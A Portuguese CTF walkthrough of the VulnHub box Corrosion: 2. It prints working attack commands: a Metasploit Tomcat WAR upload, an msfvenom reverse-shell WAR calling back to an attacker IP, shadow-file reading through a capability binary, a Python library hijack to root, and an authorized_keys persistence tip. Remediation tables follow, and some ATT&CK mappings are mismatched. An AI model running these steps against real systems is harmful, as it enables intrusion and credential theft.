# Corrosion: 2

Um arquivo ZIP protegido por senha em um diretorio Tomcat publicamente acessivel ja da um sinal suspeito forte, mano. Crackear, encontrar as credenciais admin em `tomcat-users.xml` e voce esta na metade do caminho ate o root antes mesmo de ter rodado um unico exploit. Corrosion: 2 e uma maquina VulnHub de dificuldade media que encadeia uma divulgacao de credenciais, um upload WAR autenticado no Tomcat, reuso de senha, um abuso criativo da capability `look` para leitura do shadow, e finalmente um dos exemplos mais limpos de Python library hijacking que voce vai ver em CTF. Cadeia muito legal, pô.

---

| Campo | Valor |
|---|---|
| **Nivel** | Medio |
| **VM Alvo** | Corrosion: 2 (Linux, 192.168.1.186) |
| **VM Atacante** | Kali Linux (seu IP) |
| **VulnHub URL** | https://www.vulnhub.com/entry/corrosion-2,477/ |
| **Tecnicas** | Scan de servicos nmap, brute force de diretorios web, cracking de ZIP (fcrackzip), upload WAR via Tomcat Manager, reuso de senha, abuso de capability Linux (`look`), cracking de hash /etc/shadow (John), hijack de biblioteca Python via sudo |
| **CVEs / EDBs** | Sem CVE especifico para upload autenticado no Tomcat manager (feature abusada); CVE-2020-1938 (Ghostcat, referenciado mas nao necessario aqui); Python library hijacking e uma misconfiguracao |
| **Grupos APT** | APT41 (exploracao Tomcat para acesso inicial), G0082 APT38 (roubo de credenciais + abuso Python em operacoes direcionadas) |

---

## Resumo do Ataque

```
[nmap] ---> portas 22 (SSH), 80 (HTTP), 8080 (Tomcat)
             |
             v
[dirb em :8080] ---> backup.zip
             |
             v
[fcrackzip + rockyou] ---> @administrator_hi5
             |
             v
[unzip backup.zip] ---> tomcat-users.xml ---> admin:melehifokivai
             |
             v
[MSF tomcat_mgr_upload] ---> arquivo WAR ---> Meterpreter como tomcat
             |
             v
[shell + su jaye] ---> melehifokivai (reuso de senha) ---> home do jaye
             |
             v
[./look '' /etc/shadow] ---> hash do randy
             |
             v
[john + rockyou] ---> 07051986randy
             |
             v
[ssh randy] ---> sudo -l ---> NOPASSWD python3.8 randombase64.py
             |
             v
[ls -la /usr/lib/python3.8/base64.py] ---> gravavel por todos
             |
             v
[adicionar os.system("/bin/bash") no topo do base64.py] ---> sudo python3.8 randombase64.py
             |
             v
[uid=0(root)] ---> cat /root/root.txt
```

---

## Metodologia

1. Descoberta de rede e scan de versoes nmap em todas as portas
2. Brute force de diretorios web na porta 8080 para localizar o arquivo de backup
3. Cracking de senha ZIP com fcrackzip e wordlist rockyou
4. Extracao de credenciais do `tomcat-users.xml` no arquivo
5. Upload WAR autenticado via Metasploit Tomcat Manager para foothold Meterpreter
6. Movimentacao lateral para usuario `jaye` via reuso de credenciais Tomcat
7. Leitura do arquivo shadow via binario `look` com capability elevada
8. Cracking do hash de `randy` com John; acesso SSH
9. Escalada de privilegios root via hijack de modulo gravavel da biblioteca padrao Python

---

## Passo 1: Scanning de Rede

**Contexto:** Alvo esta na rede local. Scan completo de portas para descobrir todos os servicos.

```bash
netdiscover -r 192.168.1.0/24
nmap -sV 192.168.1.186
```

**Saida esperada (resumida):**
```
22/tcp   open  ssh     OpenSSH
80/tcp   open  http    Apache httpd
8080/tcp open  http    Apache Tomcat
```

A porta 8080 e a interessante. Tomcat com manager acessivel e um alvo classico de foothold.

**Alternativa:** `nmap -sV -sC -p- 192.168.1.186` para cobertura completa incluindo portas nao-padrao.

**Nota real:** Instancias Tomcat expostas na porta 8080 sem controles de acesso por IP sao um achado consistente em ambientes enterprise. Desenvolvedores sobem Tomcat para testes e esquecem de tirar do ar ou restringir o acesso. APT41 especificamente mira interfaces Tomcat manager para acesso inicial.

**TTP MITRE:** T1046 - Network Service Scanning

---

## Passo 2: Enumeracao Web na Porta 8080

**Contexto:** Pagina padrao do Tomcat exibida na porta 8080. Brute force para encontrar caminhos nao-padrao.

```bash
dirb http://192.168.1.186:8080/ -X .php,.zip
```

**Encontrado:** `http://192.168.1.186:8080/backup.zip`

Download do arquivo:

```bash
wget http://192.168.1.186:8080/backup.zip
```

O arquivo esta protegido por senha.

**Alternativa:** `gobuster dir -u http://192.168.1.186:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x zip,bak,tar`

**Nota real:** Arquivos protegidos por senha em servidores web publicos dao falsa sensacao de seguranca. O conteudo e tao seguro quanto a senha que o protege. Desenvolvedores nunca deveriam armazenar arquivos de credenciais em diretorios web-acessiveis independentemente de criptografia.

**TTP MITRE:** T1083 - File and Directory Discovery, T1005 - Data from Local System

---

## Passo 3: Cracking do Arquivo ZIP

**Contexto:** `backup.zip` exige uma senha. Crackear offline com rockyou.

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
```

**Saida esperada:**
```
PASSWORD FOUND!!!!: pw == @administrator_hi5
```

Extrair o arquivo:

```bash
unzip backup.zip
# Senha: @administrator_hi5
```

O arquivo contem `tomcat-users.xml` com credenciais em texto puro:

```xml
<user username="admin" password="melehifokivai" roles="manager-gui,admin-gui"/>
```

Credenciais: `admin:melehifokivai`

**Alternativa:** `zip2john backup.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash`

**Nota real:** Arquivos ZIP contendo credenciais sao rotineiramente crackeados em engajamentos reais. A senha `@administrator_hi5` e suficientemente complexa para resistir a suposicoes casuais mas trivialmente crackeada pelo rockyou em segundos. E por isso que arquivos de credenciais deveriam usar gerenciamento de segredos adequado, nao criptografia de arquivo compactado.

**TTP MITRE:** T1552.001 - Unsecured Credentials: Credentials in Files, T1110.003 - Brute Force: Password Cracking

---

## Passo 4: Upload WAR via Tomcat Manager (Foothold Inicial)

**Contexto:** Credenciais do Tomcat Manager agora sao conhecidas. A interface manager permite deploi de arquivo WAR, que executa codigo arbitrario. Isso e abuso de feature autenticada, nao um CVE.

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.186
set RPORT 8080
set HttpUsername admin
set HttpPassword melehifokivai
set LHOST <seu-ip-atacante>
run
```

**Saida esperada:**
```
[+] Started reverse TCP handler
[*] Uploading 6284 bytes as 3GcFkIo.war ...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: tomcat
```

Sessao Meterpreter abre como conta de servico Tomcat.

**Alternativa:** Deploi manual de arquivo WAR via UI web do Tomcat Manager em `http://192.168.1.186:8080/manager/html`. Criar o WAR com `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o shell.war`, fazer upload pelo browser e capturar com `nc -lvnp 4444`.

**Nota real:** Upload WAR autenticado no Tomcat Manager e um vetor de ataque bem conhecido. A CISA e diversas assessorias de seguranca recomendam restringir o Tomcat Manager ao localhost (`127.0.0.1`) via configuracao `RemoteAddrValve`. Essa e uma das primeiras verificacoes em qualquer teste de penetracao de aplicacao web mirando infraestrutura Java. APT41 utilizou essa tecnica em intrusoes direcionadas.

**TTP MITRE:** T1190 - Exploit Public-Facing Application, T1505.003 - Web Shell

---

## Passo 5: Movimentacao Lateral para Usuario Jaye

**Contexto:** Meterpreter como conta de servico Tomcat. Verificar usuarios e tentar reuso de credenciais.

```bash
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Listar diretorios home:

```bash
ls /home/
# jaye  randy
```

Tentar a senha Tomcat para usuario `jaye`:

```bash
su jaye
# Senha: melehifokivai
id
# uid=1001(jaye)
```

Reuso de senha confirmado. Isso ai.

**Nota real:** Credenciais de conta de servico reutilizadas para contas de usuario sao um pivot classico. Desenvolvedores que configuram Tomcat ou outros servicos frequentemente usam a mesma senha para sua conta Linux. Sempre teste credenciais extraidas contra todas as contas locais.

**TTP MITRE:** T1078 - Valid Accounts, T1552.001 - Unsecured Credentials

---

## Passo 6: Leitura do /etc/shadow via Capability `look`

**Contexto:** Como usuario `jaye`, preciso encontrar um caminho para o usuario `randy` e depois para root. O binario `look` no diretorio home tem capabilities especiais definidas.

```bash
ls /home/jaye/
# look (binario presente)

getcap /home/jaye/look
# /home/jaye/look = cap_dac_read_search+ei
```

A capability `cap_dac_read_search` permite ler qualquer arquivo, bypassando restricoes DAC. Isso significa que `look` pode ler `/etc/shadow`:

```bash
/home/jaye/look '' /etc/shadow
```

**Saida esperada (trecho):**
```
randy:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET...:...
```

Copiar o hash de `randy`. Na maquina atacante, crackear:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt randy.hash
```

**Saida esperada:**
```
07051986randy    (randy)
```

**Alternativa:** `hashcat -m 1800 randy.hash /usr/share/wordlists/rockyou.txt -d 1` para cracking com aceleracao GPU (usar RTX 4060 disponivel).

**Nota real:** Capabilities Linux sao uma superficie de escalada de privilegios menos conhecida. `cap_dac_read_search` em qualquer binario que possa imprimir conteudo de arquivos e equivalente a ter acesso de leitura a todos os arquivos do sistema. GTFOBins documenta exatamente esse abuso de capability `look`. Verificar capabilities mal configuradas com `getcap -r / 2>/dev/null`.

**TTP MITRE:** T1548 - Abuse Elevation Control Mechanism, T1003.008 - OS Credential Dumping: /etc/passwd e /etc/shadow

---

## Passo 7: Escalada de Privilegios via Hijack de Biblioteca Python

**Contexto:** SSH como `randy` e verificar permissoes sudo.

```bash
ssh randy@192.168.1.186
# Senha: 07051986randy

sudo -l
```

**Saida:**
```
(root) NOPASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```

O script `randombase64.py` importa o modulo `base64`. Localizar o modulo:

```bash
locate base64
ls -la /usr/lib/python3.8/base64.py
# -rw-rw-rw-  ... root root ... base64.py
```

Gravavel por todos. Esse e o vetor root. Adicionar spawn de shell no topo do modulo:

```bash
nano /usr/lib/python3.8/base64.py
# Adicionar no TOPO ABSOLUTO do arquivo, antes de qualquer codigo existente:
import os
os.system("/bin/bash")
```

Disparar o comando sudo:

```bash
sudo /usr/bin/python3.8 /home/randy/randombase64.py
```

**Saida esperada:**
```
root@corrosion2:~#
id
uid=0(root)
cat /root/root.txt
```

Shell root. Completamente rekt. GG demais.

**Alternativa:** Em vez de spawn de shell, escrever um payload Python que adiciona sua chave SSH publica em `/root/.ssh/authorized_keys` para persistencia sem TTY.

**Nota real:** Hijack de biblioteca Python e um achado real que aparece tanto em CTFs quanto em testes de penetracao reais. Quando um script Python roda com privilegios elevados (via sudo, setuid ou cron) e importa de um local gravavel, o atacante controla a execucao do codigo. O fix e restringir acesso de escrita a todos os caminhos da biblioteca padrao Python com `chown root:root /usr/lib/python3.8/*.py && chmod 644 /usr/lib/python3.8/*.py`.

Essa tecnica exata foi usada por atores de ameaca em intrusoes direcionadas onde comprometeram uma conta com poucos privilegios e encontraram um interpretador Python no sudo. Audite as permissoes da sua biblioteca Python em producao.

**TTP MITRE:** T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking, T1059.006 - Command and Scripting Interpreter: Python, T1548.003 - Abuse Elevation Control Mechanism: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Fonte |
|---|---|---|
| Senha do arquivo ZIP | `@administrator_hi5` | fcrackzip + rockyou |
| Credenciais Tomcat admin | `admin:melehifokivai` | tomcat-users.xml no backup.zip |
| Credenciais movimentacao lateral | `jaye:melehifokivai` | Reuso de senha |
| Hash shadow de randy | `$6$Tb/euwmK$...` | /etc/shadow via capability `look` |
| Senha de randy | `07051986randy` | John + rockyou |
| Flag root | Ver /root/root.txt | Hijack de biblioteca Python |

---

## Licoes Aprendidas

| Achado | Impacto | Relevancia no Mundo Real |
|---|---|---|
| Arquivo de backup exposto no servidor web | Divulgacao de credenciais via cracking offline | Arquivos sensiveis nunca deveriam estar em diretorios web-acessiveis; usar gerenciamento de segredos |
| Senha ZIP fraca (`@administrator_hi5`) | Arquivo crackeado em segundos com rockyou | Criptografia ZIP oferece protecao fraca; nao armazenar arquivos de credenciais em compactados |
| Tomcat Manager acessivel pela rede | Upload WAR autenticado = RCE | Restringir Tomcat Manager ao localhost via `RemoteAddrValve`; aplicar controles em nivel de rede |
| Reuso de senha (admin Tomcat = usuario Linux) | Movimentacao lateral instantanea sem exploracao | Impor credenciais unicas por servico; gerenciadores de credenciais previnem isso trivialmente |
| Binario `look` com `cap_dac_read_search` | Ler qualquer arquivo do sistema, incluindo /etc/shadow | Auditar capabilities Linux com `getcap -r /`; nunca conceder capabilities de bypass DAC a utilitarios |
| Biblioteca Python padrao gravavel | Execucao de codigo root total via script Python no sudo | Proteger caminhos da biblioteca Python com propriedade e permissoes estritas; evitar conceder sudo a interpretadores Python |

---

## Mapeamento MITRE ATT&CK

| Tecnica | ID | Tatica |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Web Shell | T1505.003 | Persistence |
| Valid Accounts | T1078 | Lateral Movement |
| Command and Scripting Interpreter: Python | T1059.006 | Execution |
| Scheduled Task/Job (sudo) | T1053 | Privilege Escalation |
| Abuse Elevation Control Mechanism: Sudo | T1548.003 | Privilege Escalation |
| Hijack Execution Flow: Python Library | T1574.006 | Privilege Escalation |
| Network Service Scanning | T1046 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Brute Force: Password Cracking | T1110.003 | Credential Access |
| Unsecured Credentials: Credentials in Files | T1552.001 | Credential Access |
| OS Credential Dumping: /etc/shadow | T1003.008 | Credential Access |

---

## Remediacao

### NIST CSF 2.0

| Funcao | Controle | Acao |
|---|---|---|
| PR.DS-1 | Protecao de Dados em Repouso | Remover arquivos sensiveis de diretorios web-acessiveis; usar gerenciador de segredos dedicado |
| PR.AC-3 | Gerenciamento de Acesso Remoto | Restringir Tomcat Manager ao localhost ou IPs confiados; desabilitar manager em producao |
| DE.CM-7 | Monitoramento para Atividade Nao Autorizada | Alertar em escritas em caminhos da biblioteca padrao Python; monitorar invocacoes sudo Python |
| ID.AM-2 | Gerenciamento de Ativos de Software | Inventariar todos os servicos voltados para internet; sinalizar instancias Tomcat Manager acessiveis de redes nao confiadas |

### NIST SP 800-53

| Controle | Descricao |
|---|---|
| SC-28 | Protecao de Informacoes em Repouso (usar gerenciamento de segredos adequado, nao criptografia de arquivo, para credenciais) |
| AC-17 | Acesso Remoto (restringir Tomcat Manager a hosts confiados; aplicar configuracao RemoteAddrValve) |
| AC-6 | Menor Privilegio (restringir capabilities Linux; nunca conceder `cap_dac_read_search` a utilitarios de proposito geral) |
| CM-6 | Definicoes de Configuracao (definir propriedade/permissoes corretas nos arquivos da biblioteca padrao Python) |
| IA-5 | Gerenciamento de Autenticadores (impor senhas unicas por servico; proibir reuso de credenciais) |

### CISA KEV

Upload WAR autenticado no Tomcat Manager e documentado em assessorias da CISA para Apache Tomcat (ver CVE-2017-12617 e assessorias relacionadas). Python library hijacking via modulos graveis e documentado na orientacao de hardening Linux da CISA e na assessoria conjunta NSA/CISA sobre misconfiguracoes Linux exploradas. O abuso de capability `look` mapeia para a categoria mais ampla de uso indevido de capability Linux documentado na assessoria AA21-265A da CISA.

### C2M2 (Cybersecurity Capability Maturity Model)

| Dominio | Maturidade Atual | Maturidade Alvo | Lacuna |
|---|---|---|---|
| Gerenciamento de Ativos e Configuracoes | MIL0 (sem inventario de arquivos web-acessiveis; sem baseline de permissoes da biblioteca Python) | MIL2 | Scanning automatizado de diretorio web; benchmark CIS para permissoes biblioteca Python |
| Gerenciamento de Ameacas e Vulnerabilidades | MIL0 (sem scanning de exposicao Tomcat Manager) | MIL2 | Varreduras autenticadas mensais; avaliacao de segmentacao de rede |
| Gerenciamento de Identidade e Acesso | MIL0 (reuso de credenciais, sem isolamento de conta de servico) | MIL2 | Impor credenciais unicas por servico; implementar controles baseados em PAM |

### MITRE D3FEND

| Tecnica D3FEND | ID | Endereca |
|---|---|---|
| File Content Policies | D3-FCOP | Prevenir escritas em caminhos da biblioteca padrao Python |
| Process Spawn Analysis | D3-PSA | Detectar Python gerando shells a partir de contexto de importacao de biblioteca padrao |
| Network Traffic Filtering | D3-NTF | Bloquear acesso externo a porta Tomcat Manager 8080 |
| Credential Hardening | D3-CH | Impor senhas fortes unicas; proibir reuso de credenciais |
| System Call Filtering | D3-SCF | Restringir atribuicoes de capability a binarios usando seccomp ou AppArmor |

---

## Consideracoes Finais

Corrosion: 2 e uma box incrivelmente instrutiva porque demonstra que comprometimentos reais raramente dependem de exploracao de CVE. Cada passo aqui e uma falha de configuracao: um arquivo de backup no lugar errado, uma senha ZIP fraca, Tomcat Manager exposto para a rede, uma senha reutilizada, uma capability no binario errado e bibliotecas Python graveis por todos. Nenhuma dessas isoladamente grita "critico", mas encadeadas produzem um comprometimento total de root a partir de uma unica porta exposta.

O passo de hijack da biblioteca Python e o destaque dessa box. E limpo, elegante e diretamente aplicavel a engajamentos reais. Sempre que voce ver `sudo python3 <script>` numa saida de `sudo -l`, sua primeira pergunta deve ser: "O que esse script importa, e esses modulos sao graveis?" A resposta frequentemente e mais interessante do que voce espera, tá ligado?

Thanks guys!! (❍ᴥ❍ʋ)
